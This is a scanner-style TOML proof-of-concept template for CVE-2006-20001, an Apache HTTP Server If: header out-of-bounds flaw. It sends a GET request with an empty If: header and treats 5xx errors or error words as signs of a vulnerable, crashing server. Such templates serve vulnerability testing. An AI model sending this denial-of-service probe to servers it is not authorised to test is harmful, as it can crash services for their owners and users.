[info]
id = "POC-AVE-2006-0005"
name = "Apache HTTP Server If: Header OOB PoC"
author = "AVE"
severity = "high"
tags = ["CWE-787", "dos", "oob"]
description = "Apache HTTP Server 2.4.54及更早版本中，精心构造的If:请求头可触发堆内存越界读取/写入，导致进程崩溃。发送包含异常If:头的HTTP请求，若服务器返回500或连接中断则可能存在漏洞。"
vuln_id = ["CVE-2006-20001", "AVE-2006-0005"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/"
headers.If = ""

[[poc.requests.matchers]]
type = "status"
status = [500, 502, 503]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["Internal Server Error", "Service Unavailable", "500"]
expect = true
